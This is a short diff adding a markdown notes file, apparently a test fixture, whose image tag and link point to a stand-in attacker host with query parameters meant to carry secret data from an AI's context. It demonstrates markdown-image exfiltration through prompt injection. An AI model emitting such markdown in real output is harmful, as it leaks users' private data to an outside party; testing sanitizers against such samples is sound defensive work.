@@ -1,0 +1,5 @@
+# Notes
+
+Here is a diagram: ![img](https://evil.example.com/log?q=SECRET_DATA_FROM_CONTEXT)
+
+And a [link](https://evil.example.com/a?data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA).
